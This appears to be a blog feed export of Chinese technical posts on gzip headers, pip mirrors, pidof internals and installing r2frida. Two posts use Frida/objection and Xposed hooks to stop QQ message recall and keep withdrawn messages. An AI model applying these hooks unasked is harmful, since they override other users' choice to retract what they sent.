<h2 id="Header格式"><a href="#Header格式" class="headerlink" title="Header格式"></a>Header格式</h2><p>详见<a href="https://www.rfc-editor.org/rfc/rfc1952.txt">RFC1952</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---+---+---+---+---+---+---+---+---+---+</span><br><span class="line">|ID1|ID2|CM |FLG|     MTIME     |XFL|OS | (more--&gt;)</span><br><span class="line">+---+---+---+---+---+---+---+---+---+---+</span><br><span class="line"></span><br><span class="line">XFL (eXtra FLags)</span><br><span class="line">These flags are available for use by specific compression</span><br><span class="line">methods.  The &quot;deflate&quot; method (CM = 8) sets these flags as</span><br><span class="line">follows:</span><br><span class="line"></span><br><span class="line">XFL = 2 - compressor used maximum compression,</span><br><span class="line">        slowest algorithm</span><br><span class="line">XFL = 4 - compressor used fastest algorithm</span><br><span class="line"></span><br><span class="line">OS (Operating System)</span><br><span class="line">This identifies the type of file system on which compression</span><br><span class="line">took place.  This may be useful in determining end-of-line</span><br><span class="line">convention for text files.  The currently defined values are</span><br><span class="line">as follows:</span><br><span class="line">0 - FAT filesystem (MS-DOS, OS/2, NT/Win32)</span><br><span class="line">1 - Amiga</span><br><span class="line">2 - VMS (or OpenVMS)</span><br><span class="line">3 - Unix</span><br><span class="line">4 - VM/CMS</span><br><span class="line">5 - Atari TOS</span><br><span class="line">6 - HPFS filesystem (OS/2, NT)</span><br><span class="line">7 - Macintosh</span><br><span class="line">8 - Z-System</span><br><span class="line">9 - CP/M</span><br><span class="line">10 - TOPS-20</span><br><span class="line">11 - NTFS filesystem (NT)</span><br><span class="line">12 - QDOS</span><br><span class="line">13 - Acorn RISCOS</span><br><span class="line">255 - unknown</span><br></pre></td></tr></table></figure>
<p>其中<code>XFL</code>为压缩等级标识，<code>OS</code>为系统标识</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/python/cpython/blob/main/Lib/gzip.py">gzip.py</a>的<code>_write_gzip_header</code>函数：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> compresslevel == _COMPRESS_LEVEL_BEST:</span><br><span class="line">    xfl = <span class="string">b&#x27;\002&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> compresslevel == _COMPRESS_LEVEL_FAST:</span><br><span class="line">    xfl = <span class="string">b&#x27;\004&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    xfl = <span class="string">b&#x27;\000&#x27;</span></span><br><span class="line">self.fileobj.write(xfl)</span><br><span class="line">self.fileobj.write(<span class="string">b&#x27;\377&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> fname:</span><br><span class="line">    self.fileobj.write(fname + <span class="string">b&#x27;\000&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到OS标识被硬编码为<code>b&#39;\377&#39;</code>（即<code>b&#39;\xff&#39;</code>）</p>
<p>如果需要指定该标志，则需要手动patch</p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python pip永久换源</title>
    <url>/2020/04/15/python-specify-pip-source-url/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>最近安装python模块非常慢，甚至直接超时。更换源后解决</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><code>C:\Users\用户名\pip\pip.ini</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>编辑<code>~/.pip/pip.conf</code>内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/-fengmu/p/12309268.html">pip国内源设置方法</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>pidof 源码分析</title>
    <url>/2022/05/03/pidof-analisis/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>执行<code>ls -all $(which pidof)</code>，结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 14 May 19  2021 /usr/bin/pidof -&gt; /sbin/killall5</span><br></pre></td></tr></table></figure>

<h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><p><a href="https://github.com/limingth/sysvinit/blob/master/sysvinit-2.88dsf/src/killall5.c">killall5.c</a></p>
<span id="more"></span>

<h2 id="Linux-man-page"><a href="#Linux-man-page" class="headerlink" title="Linux man page"></a>Linux man page</h2><p><a href="https://linux.die.net/man/8/pidof">pidof(8)_ find process ID of running program - Linux man page</a></p>
<h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h3><blockquote>
<p>pidof is actually the same program as killall5; the program behaves according to the name under which it is called.<br>When pidof is invoked with a full pathname to the program it should find the pid of, it is reasonably safe. Otherwise it is possible that it returns pids of running programs that happen to have the same name as the program you’re after but are actually other programs. Note that that the executable name of running processes is calculated with readlink(2), so symbolic links to executables will also match.</p>
</blockquote>
<p><code>pidof</code>实际上就是<code>killall5</code>，通过调用名称来执行不同操作。<br>源码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get program name. */</span></span><br><span class="line"><span class="keyword">if</span> ((progname = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">	progname = argv[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	progname++;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now connect to syslog. */</span></span><br><span class="line"><span class="built_in">openlog</span>(progname, LOG_CONS|LOG_PID, LOG_DAEMON);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Were we called as &#x27;pidof&#x27; ? */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(progname, <span class="string">&quot;pidof&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">main_pidof</span>(argc, argv);</span><br></pre></td></tr></table></figure>

<h2 id="main-pidof"><a href="#main-pidof" class="headerlink" title="main_pidof"></a>main_pidof</h2><h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><p>使用<code>strace</code>打印系统调用，<code>strace pidof 1</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openat(AT_FDCWD, &quot;156204/stat&quot;, O_RDONLY) = 4</span><br><span class="line">newfstatat(4, &quot;&quot;, &#123;st_mode=S_IFREG|0444, st_size=0, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">read(4, &quot;156204 (pidof) R 156201 156201 1&quot;..., 4096) = 316</span><br><span class="line">read(4, &quot;&quot;, 3072)                       = 0</span><br><span class="line">close(4)                                = 0</span><br><span class="line">openat(AT_FDCWD, &quot;156204/cmdline&quot;, O_RDONLY) = 4</span><br><span class="line">newfstatat(4, &quot;&quot;, &#123;st_mode=S_IFREG|0444, st_size=0, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">read(4, &quot;pidof\0001\0&quot;, 1024)           = 8</span><br><span class="line">close(4)                                = 0</span><br><span class="line">newfstatat(AT_FDCWD, &quot;/proc/156204/exe&quot;, &#123;st_mode=S_IFREG|0755, st_size=27016, ...&#125;, 0) = 0</span><br><span class="line">readlink(&quot;/proc/156204/exe&quot;, &quot;/usr/sbin/killall5&quot;, 4096) = 18</span><br><span class="line">getdents64(3, 0x559a95f732d0 /* 0 entries */, 32768) = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">getuid()                                = 1000</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot;151675\n&quot;, 7151675</span><br><span class="line">)                 = 7</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure>

<p>遍历<code>/proc/</code>，读取了<code>/proc/$pid/stat</code>、<code>/proc/$pid/cmdline</code>的文件内容，以及<code>/proc/$pid/exe</code>的符号链接。</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><ol>
<li>先调用<code>readproc</code>，<code>fopen</code> <code>/proc/$pid/stat</code>和<code>/proc/$pid/cmdline</code></li>
<li>再调用<code>pidof</code>，<code>readlink</code> <code>/proc/$pid/exe</code></li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cboard.cprogramming.com/c-programming/180610-get-pid-process-giving-name.html">Get PID of a process by giving the name - C Board</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>QQ8.1.3防撤回(Xposed模块)的原理</title>
    <url>/2019/09/18/qq-813-unrevoke-module-develop/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>开发一个适配QQ 8.1.3的防撤回插件，并显示撤回通知。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="1-防撤回"><a href="#1-防撤回" class="headerlink" title="1. 防撤回"></a>1. 防撤回</h3><p>设置<code>com.tencent.mobileqq.app.message.QQMessageFacade.a(ArrayList.class, boolean.class)</code>方法的返回值为空即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//在beforeHookedMethod中执行</span><br><span class="line">param.setResult(null);</span><br></pre></td></tr></table></figure>

<h3 id="2-获取必要信息"><a href="#2-获取必要信息" class="headerlink" title="2. 获取必要信息"></a>2. 获取必要信息</h3><p>上一个方法的第一个参数(<code>ArrayList</code>)内容(<code>toString</code>)形如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RevokeMsgInfo[istroop= 1, shmsgseq= 356, frienduin= 1234568, fromuin= 12345678 msguid= 0, time= 1568796904, senduin= null, longmsgid= 0, longmsgcount=0 longmsgindex=0]</span><br></pre></td></tr></table></figure>
<p>当<code>istroop</code>为1时，<code>frienduin</code>是群号，否则为好友qq。</p>
<p>在某个版本后，<code>toString</code>的结果中<code>frienduin</code>被截断，所以解析字符串的方法行不通了。</p>
<p>可以通过反射来获取需要的字段值。</p>
<h3 id="3-显示撤回提示"><a href="#3-显示撤回提示" class="headerlink" title="3. 显示撤回提示"></a>3. 显示撤回提示</h3><p>这个功能的实现比较复杂，需要获取和生成一些类对象。</p>
<p>首先通过反射获取到<code>QQAppInterface</code>实例（<code>QQMessageFacade</code>的字段）<br>然后调用<code>QQAppInterface.getCurrentAccountUin</code>方法获取自己的qq<br>再通过反射将<code>RevokeMsgInfo</code>字段取出，为构造撤回提示做准备。<br>然后通过<code>MessageRecordFactory</code>构造<code>MessageRecord</code>。<br>然后使用<code>ArrayList</code>将其打包。<br>最终调用<code>com.tencent.mobileqq.app.message.QQMessageFacade.a(ArrayList.class, int.class)</code>方法来显示撤回提示。</p>
<p>具体可以参考<a href="https://github.com/zpp0196/QQPurify/blob/master/app/src/main/java/me/zpp0196/qqpurify/hook/ExtensionHook.java">QQ净化的防撤回实现</a>。</p>
<h3 id="4-进行一些操作"><a href="#4-进行一些操作" class="headerlink" title="4. 进行一些操作"></a>4. 进行一些操作</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><p>判断是否为自己撤回的信息，如果是则不做处理。</p>
<h4 id="获取群成员名"><a href="#获取群成员名" class="headerlink" title="获取群成员名"></a>获取群成员名</h4><p>通过调用<code>ContactUtils</code>的函数来获得。</p>
<h2 id="为什么要适配"><a href="#为什么要适配" class="headerlink" title="为什么要适配"></a>为什么要适配</h2><p>因为QQ版本不同，有些类名经过了混淆。<br>适配的关键在于找出混淆后的类名。<br>可反编译dex后，根据特征（字符串、函数参数、类结构等）查找smali。</p>
<p>防撤回功能涉及以下两个被混淆的类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String MessageRecordFactory = &quot;avay&quot;;</span><br><span class="line">String ContactUtils = &quot;azcx&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/langhun/QQUnrecalled">QQUnrecalled</a><br><a href="https://github.com/zpp0196/QQPurify">QQPurify</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux和Windows上安装r2frida</title>
    <url>/2021/10/01/r2frida-install-on-linux-and-win/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之前了解到<a href="https://github.com/nowsecure/r2frida">r2frida</a>这一工具，由于环境问题，并未安装成功。</p>
<p>在<code>Kali Linux</code>和<code>Windows</code>上安装<code>r2frida</code>成功，记录一下。</p>
<span id="more"></span>

<h2 id="Linux安装"><a href="#Linux安装" class="headerlink" title="Linux安装"></a>Linux安装</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>系统：<code>Kali Linux 2021.2</code><br>软件：<code>Node.js 12.22.5</code>、<code>Frida 15.1.3</code><br>安装目标：<code>Radare2 5.4.2</code>、<code>r2frida 5.4.4</code></p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/radareorg/radare2</span><br><span class="line">radare2/sys/install.sh</span><br></pre></td></tr></table></figure>
<h4 id="r2frida"><a href="#r2frida" class="headerlink" title="r2frida"></a>r2frida</h4><p>可直接到<a href="https://github.com/nowsecure/r2frida/releases">Release页</a>下载，以下是自行编译流程</p>
<h5 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install -y make gcc libzip-dev nodejs npm curl pkg-config git</span><br></pre></td></tr></table></figure>
<h5 id="更换npm源（可选）"><a href="#更换npm源（可选）" class="headerlink" title="更换npm源（可选）"></a>更换npm源（可选）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry http://registry.npmmirror.com</span><br></pre></td></tr></table></figure>
<h5 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/nowsecure/r2frida</span><br></pre></td></tr></table></figure>
<h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><p>编辑<code>Makefile</code>，修改<code>frida_version</code>为frida安装版本</p>
<h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>安装成功将提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p &quot;//usr/local/lib/radare2/5.4.3&quot;</span><br><span class="line">cp -f io_frida.so* /&quot;/usr/local/lib/radare2/5.4.3&quot;</span><br></pre></td></tr></table></figure>

<p>运行<code>r2 frida://?</code>显示帮助，测试插件是否安装成功。</p>
<h2 id="Windows安装"><a href="#Windows安装" class="headerlink" title="Windows安装"></a>Windows安装</h2><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>系统：<code>Windows 10 20H2 x64</code><br>软件：<code>Visual Studio 2019</code>、<code>Node.js 14.17.4</code>、<code>Cygwin 3.2.0</code>(记得选择<code>wget</code>)、<code>Frida 15.1.2</code><br>（提前安装好以上环境，VS版本至少为2015）</p>
<p>安装目标：<code>Radare2 5.4.2</code>、<code>r2frida 5.4.4</code></p>
<h2 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h2><h3 id="radare2-1"><a href="#radare2-1" class="headerlink" title="radare2"></a>radare2</h3><p>前往<a href="https://github.com/radareorg/radare2/releases">Releases · radareorg/radare2</a>下载<code>radare2-5.4.2-w64.zip</code>，解压到任意目录。<br>将<code>..\radare2\bin</code>目录添加到<code>PATH</code>环境变量后，执行<code>r2 -v</code>查看版本号</p>
<h3 id="r2frida-1"><a href="#r2frida-1" class="headerlink" title="r2frida"></a>r2frida</h3><p>可直接到<a href="https://github.com/nowsecure/r2frida/releases">Release页</a>下载，以下是自行编译流程</p>
<h4 id="更换npm源（可选）-1"><a href="#更换npm源（可选）-1" class="headerlink" title="更换npm源（可选）"></a>更换npm源（可选）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry http://registry.npmmirror.com</span><br></pre></td></tr></table></figure>
<h4 id="克隆仓库-1"><a href="#克隆仓库-1" class="headerlink" title="克隆仓库"></a>克隆仓库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/nowsecure/r2frida</span><br></pre></td></tr></table></figure>
<h4 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h4><p>编辑<code>build.bat</code>，修改<code>frida_version</code>为frida安装版本，修改<code>R2_BASE</code>为<code>radare2</code>安装目录（不需要<code>bin</code>）</p>
<p>将<code>..\radare2\include\libr\r_cons.h</code>以<code>UTF-8 with BOM</code>编码重新保存（防止编译出错）</p>
<h4 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h4><p>在<code>cmd</code>中打开该目录，使用<code>vcvarsall.bat</code>初始化环境，然后执行安装脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;[Visual Studio安装位置]\VC\Auxiliary\Build\vcvarsall.bat&quot; x64</span><br><span class="line">.\build.bat install</span><br></pre></td></tr></table></figure>
<p>安装成功将提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Installing...</span><br><span class="line">Copying &#x27;io_frida.dll&#x27; to C:\Users\xhy\.local\share\radare2\plugins</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure>

<p>运行<code>r2 frida://?</code>显示帮助，测试插件是否安装成功。<br>结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r2 frida://[action]/[link]/[device]/[target]</span><br><span class="line">* action = list | apps | attach | spawn | launch</span><br><span class="line">* link   = local | usb | remote host:port</span><br><span class="line">* device = &#x27;&#x27; | host:port | device-id</span><br><span class="line">* target = pid | appname | process-name | program-in-path | abspath</span><br><span class="line">Local:</span><br><span class="line">* frida://?                        # show this help</span><br><span class="line">* frida://                         # list local processes</span><br><span class="line">* frida://0                        # attach to frida-helper (no spawn needed)</span><br><span class="line">* frida:///usr/local/bin/rax2      # abspath to spawn</span><br><span class="line">* frida://rax2                     # same as above, considering local/bin is in PATH</span><br><span class="line">* frida://spawn/$(program)         # spawn a new process in the current system</span><br><span class="line">* frida://attach/(target)          # attach to target PID in current host</span><br><span class="line">USB:</span><br><span class="line">* frida://list/usb//               # list processes in the first usb device</span><br><span class="line">* frida://apps/usb//               # list apps in the first usb device</span><br><span class="line">* frida://attach/usb//12345        # attach to given pid in the first usb device</span><br><span class="line">* frida://spawn/usb//appname       # spawn an app in the first resolved usb device</span><br><span class="line">* frida://launch/usb//appname      # spawn+resume an app in the first usb device</span><br><span class="line">Remote:</span><br><span class="line">* frida://attach/remote/10.0.0.3:9999/558 # attach to pid 558 on tcp remote frida-server</span><br><span class="line">Environment:</span><br><span class="line">  R2FRIDA_SAFE_IO                  # Workaround a Frida bug on Android/thumb</span><br><span class="line">  R2FRIDA_DEBUG                    # Used to debug argument parsing behaviour</span><br><span class="line">  R2FRIDA_AGENT_SCRIPT             # path to file of the r2frida agent</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>（连接帮助见上文）</p>
<h3 id="获取usb-device-id（可选）"><a href="#获取usb-device-id（可选）" class="headerlink" title="获取usb device id（可选）"></a>获取usb device id（可选）</h3><p>执行<code>frida-ls-devices</code>，获取<code>usb device id</code><br>然后启动app：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r2 frida://launch/usb/[设备id]/[包名]</span><br></pre></td></tr></table></figure>
<p>设备id为空时，连接第一个usb设备</p>
<h3 id="查询帮助"><a href="#查询帮助" class="headerlink" title="查询帮助"></a>查询帮助</h3><blockquote>
<p>r2frida commands are prefixed with <code>=!</code> or <code>:</code>.</p>
</blockquote>
<p>附加上app后，如果要使用<code>r2frida</code>的命令，需要在前面增加<code>=!</code>或<code>:</code><br>如：<code>=!?</code>、<code>:?</code>（获取帮助）<br>在命令后加问号，可查询命令帮助，如<code>:/?</code>、<code>ps?</code></p>
<h3 id="过滤输出"><a href="#过滤输出" class="headerlink" title="过滤输出"></a>过滤输出</h3><p>使用<code>~</code>过滤输出结果，类似于<code>grep</code><br>例如：<code>:il~libart.so</code> (仅输出<code>libart.so</code>地址)</p>
<h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><p><code>:i?</code>: 查看帮助</p>
<p><code>:i</code>: 查询信息<br><code>:ic</code>: 列出所有类<br><code>:icl</code>: 列出已加载的类<br><code>:icm</code>: 列出类方法<br><code>:il</code>: 列出模块<br><code>:iE 模块名</code>: 列出模块导出符号</p>
<h3 id="搜索字符串"><a href="#搜索字符串" class="headerlink" title="搜索字符串"></a>搜索字符串</h3><p><code>:/?</code>：查看帮助</p>
<p><code>:/ 关键字</code>: 在内存中搜索关键字<br><code>:/x 16进制</code>: 在内存中搜索十六进制数据</p>
<h3 id="打印内存、反汇编"><a href="#打印内存、反汇编" class="headerlink" title="打印内存、反汇编"></a>打印内存、反汇编</h3><p><code>p?</code>：查看帮助 (这是r2的命令，不需要冒号)</p>
<p><code>s 地址</code>: 设置当前地址</p>
<p><code>x</code>: <code>hexdump</code>当前地址的内存<br><code>x @ 地址</code>: <code>hexdump</code>指定地址的内存（其他命令同理）<br><code>ps</code>: 打印字符串<br><code>pd</code>: 反汇编</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p><code>:d?</code>: 查看帮助</p>
<p><code>:dm</code>: 列出内存区域（类似于<code>maps</code>文件）<br><code>:dt</code>: 跟踪地址调用<br><code>:dtf</code>: 跟踪地址调用，并格式化输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: dtf [format] || dtf [addr] [fmt]</span><br><span class="line">  ^  = trace onEnter instead of onExit</span><br><span class="line">  +  = show backtrace on trace</span><br><span class="line"> p/x = show pointer in hexadecimal</span><br><span class="line">  c  = show value as a string (char)</span><br><span class="line">  i  = show decimal argument</span><br><span class="line">  z  = show pointer to string</span><br><span class="line">  w  = show pointer to UTF-16 string</span><br><span class="line">  a  = show pointer to ANSI string</span><br><span class="line">  h  = hexdump from pointer (optional length, h16 to dump 16 bytes)</span><br><span class="line">  H  = hexdump from pointer (optional position of length argument, H1 to dump args[1] bytes)</span><br><span class="line">  s  = show string in place</span><br><span class="line">  O  = show pointer to ObjC object</span><br><span class="line">Undocumented: Z, S</span><br><span class="line"> dtf    trace format</span><br></pre></td></tr></table></figure>

<h3 id="加载Frida脚本"><a href="#加载Frida脚本" class="headerlink" title="加载Frida脚本"></a>加载Frida脚本</h3><p><code>:.?</code>: 查看帮助</p>
<p><code>:. 脚本路径</code>: 加载js脚本</p>
<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p><code>cl</code>清屏</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mabin004.github.io/2021/02/19/r2frida%E4%BD%BF%E7%94%A8/">r2frida使用</a><br><a href="https://bbs.pediy.com/thread-264161.htm">Android动态调试-R2frida和lldb</a><br><a href="https://bbs.pediy.com/thread-256858.htm">RADARE2+FRIDA=R2FRIDA Best Dynamic Debugging Tool</a><br><a href="https://blog.csdn.net/u013255206/article/details/75295209">vs编译 error C2001: 常量中有换行符</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>QQ 8.8.17 防撤回、无限打开闪照</title>
    <url>/2021/08/04/qq-8817-unrevoke-and-infinite-flashpic/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之前写过一篇<a href="https://blog.xhyeax.com/2019/09/18/qq-813-unrevoke-module-develop/">QQ8.1.3防撤回原理</a>，每次更新后，都需要适配被混淆的类名。</p>
<p>今天更新了最新版QQ（<code>8.8.17</code>），发现使用到的类名都未被混淆，不过包结构有了一定变化（可能是重构了？），需要重新适配。</p>
<p>于是尝试使用<code>objection</code>分析撤回提示的实现，并编写<code>Xposed</code>模块。</p>
<span id="more"></span>
<h2 id="防撤回"><a href="#防撤回" class="headerlink" title="防撤回"></a>防撤回</h2><p>与之前一样，设置<code>com.tencent.mobileqq.app.message.QQMessageFacade.a(ArrayList, boolean)</code>方法的返回值为空即可</p>
<h2 id="显示撤回提示"><a href="#显示撤回提示" class="headerlink" title="显示撤回提示"></a>显示撤回提示</h2><p>定位到关键类<code>com.tencent.mobileqq.msg.api.impl.MessageFacadeImpl</code>，其中提供有<code>QQMessageFacade</code>类的接口，包括删除消息、增加消息等功能。</p>
<p>其中增加消息有以下两个函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  <span class="comment">// com.tencent.mobileqq.msg.api.IMessageFacade</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addMessage</span><span class="params">(MessageRecord arg2, String arg3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.getMessageFacade().a(arg2, arg3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span>  <span class="comment">// com.tencent.mobileqq.msg.api.IMessageFacade</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addMessage</span><span class="params">(MessageRecord arg9, String arg10, <span class="keyword">boolean</span> arg11, <span class="keyword">boolean</span> arg12, <span class="keyword">boolean</span> arg13, <span class="keyword">boolean</span> arg14)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.checkAppRuntimeInValid()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.getMessageFacade().a(arg9, arg10, arg11, arg12, arg13, arg14);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过以前对旧版qq的分析可知，撤回消息的流程为：删除本地消息记录-创建撤回提示-增加撤回提示到本地</p>
<p>因此，使用<code>objection</code> hook <code>addMessage</code>函数，打印参数和调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.tencent.mobileqq.msg.api.impl.MessageFacadeImpl.addMessage --dump-args --dump-backtrace</span><br></pre></td></tr></table></figure>
<p>首先使用另一个qq发送消息，发现调用的是第一个函数<code>addMessage(MessageRecord, String)</code></p>
<p>使用另一个qq撤回消息，日志如下：</p>
<h3 id="撤回私聊消息"><a href="#撤回私聊消息" class="headerlink" title="撤回私聊消息"></a>撤回私聊消息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.tencent.mobileqq.msg.api.impl.MessageFacadeImpl.addMessage(Native Method)</span><br><span class="line">com.tencent.mobileqq.graytip.UniteGrayTipMsgUtil.a(P:70)</span><br><span class="line">com.tencent.imcore.message.BaseMessageManager.a(P:2259)</span><br><span class="line">com.tencent.imcore.message.QQMessageFacade.a(P:1358)</span><br><span class="line">com.tencent.mobileqq.service.message.codec.decoder.msgType0x210.MsgType0x210Decoder.a(P:1017)</span><br></pre></td></tr></table></figure>
<h3 id="撤回群聊消息"><a href="#撤回群聊消息" class="headerlink" title="撤回群聊消息"></a>撤回群聊消息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.tencent.mobileqq.msg.api.impl.MessageFacadeImpl.addMessage(Native Method)</span><br><span class="line">com.tencent.mobileqq.graytip.UniteGrayTipMsgUtil.a(P:70)</span><br><span class="line">com.tencent.imcore.message.BaseMessageManager.a(P:2259)</span><br><span class="line">com.tencent.imcore.message.QQMessageFacade.a(P:1358)</span><br><span class="line">com.tencent.mobileqq.troop.utils.TroopTipsMsgMgr.a(P:462)</span><br></pre></td></tr></table></figure>

<p>注意到无论是撤回私聊还是群聊消息，都是调用<code>com.tencent.mobileqq.msg.api.impl.MessageFacadeImpl.addMessage(com.tencent.mobileqq.data.MessageRecord, java.lang.String, boolean, boolean, boolean, boolean)</code>，(参数值为<code>false,true,true,false</code>)：</p>
<p>而该方法最终调用的是<code>BaseQQMessage.a(MessageRecord,String,boolean,boolean,boolean,boolean)</code>函数</p>
<p>因此，我们构造完<code>MessageRecord</code>后，依葫芦画瓢，调用该函数即可。</p>
